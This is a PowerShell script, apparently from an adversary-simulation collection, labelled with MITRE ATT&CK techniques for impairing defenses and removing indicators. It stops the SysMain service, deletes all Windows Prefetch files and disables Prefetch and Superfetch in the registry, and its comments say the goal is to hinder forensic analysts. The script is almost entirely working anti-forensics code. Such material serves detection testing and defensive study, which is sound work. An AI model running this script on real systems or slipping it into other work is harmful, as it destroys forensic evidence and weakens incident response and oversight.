<#
    T1562.001  -  Impair Defenses: Disable or Modify Tools 
    T1112 -  Modify Registry 
    T1489 -  Service Stop
    T1070.004 -  Indicator Removal: File Deletion 
    T1070.009 -  Indicator Removal: Clear Persistence 
    This script will remove prefetch files and disable prefetch and superprefetch in registry
    Impact: Removing Prefetch files on Windows can have a major forensic impact. Prefetch files are used by windows to store information about applications that have been recently run. 
    This information includes the name of the application, the time it was run, and the number of times it was run.
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
try{
    # Stop prefetch service
    Stop-Service -Name SysMain -Force 

    #Remove prefetch files
    $Files = Get-ChildItem -Path $env:SystemRoot\Prefetch -Recurse
    Foreach ($File in $Files){
        Write-Host $File
        Remove-Item -Path $File -Force -Recurse
        Write-Host "Removed file: $($File.Name)"
    }

    # Disabling prefetch and superfetch, the system will not keep as much data in its cache, making it harder for the forensic analyst to find evidence that may have been stored in the cache.
    # Additionally, disabling prefetch and superfetch can make it more difficult to trace activity on the system, as the system will not be able to keep track of recent activities as easily.
    $PrefetchReg = "HKLM:\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters"
    if (-Not (Test-Path -Path $PrefetchReg)){
        New-ItemProperty -Path $PrefetchReg
    }
    Set-ItemProperty -Path $PrefetchReg -Name "EnablePrefetcher" -Value 0
    Set-ItemProperty -Path $PrefetchReg -Name "EnableSuperfetch" -Value 0
}
catch{
    Write-host -ForegroundColor Red "Error: $_"
}
#Restart-Computer -Force

Stop-Transcript
